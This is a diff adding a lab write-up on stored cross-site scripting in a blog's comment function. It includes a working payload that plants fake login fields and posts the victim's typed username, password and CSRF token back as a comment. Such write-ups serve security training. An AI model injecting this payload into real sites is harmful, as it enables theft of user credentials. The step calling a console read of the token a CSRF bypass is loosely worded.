@@ -1,0 +1,67 @@
+// Lab: Exploiting cross-site scripting to capture passwords
+
+This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account. 
+
+
+// Solution
+
+
+1. Write the script in comment section:
+<script>alert('hacked')</script>
+
+followed by name, website and email
+
+
+2. Now we Inspect and in console we Write:
+    /* document.cookie */ 
+   to get session
+
+
+3. Then we check the source code where at the bottom we find:
+<input required type="hidden" name="csrf" value="xxxxx">
+we check csrf
+
+4. Now bypassing the csrf by writing in console:
+    /* document.getElementsByName('csrf')[0].value */
+    we get the value "nfDuRedgCfknUJRhjxf37CNuzCHOvdX7"
+
+
+5. Now Injecting the script we have written and Inject it in comment.
+
+
+// Exploit2.html
+
+<input type="text" name="username">
+<input type="password" name="password" onchange="hax()">    // Fake login inputs
+
+<script>
+    function hax() {
+        const token = document.getElementsByName('csrf')[0].value;
+        const username = document.getElementsByName('username')[0].value;
+        const password = document.getElementsByName('password')[0].value;
+
+        const data = new FormData();
+
+        data.append('csrf', token);
+        data.append('postId', 4);
+        data.append('comment', `${username} :${password}`);
+         data.append('name', 'victim');
+        data.append('email', 'sbb@gmail.com');
+        data.append('website', 'http://www.foo.com');
+
+        fetch('/post/comment', {
+            method: 'POST',
+            mode: 'no-cors',
+            body: data
+        });
+    }
+    
+</script>
+
+
+6. Now we get the username + password in comment field of the blog
+
+For Example -> administrator :xxxxxxxx
+
+
+7. Now login using these credentials and lab will be solved
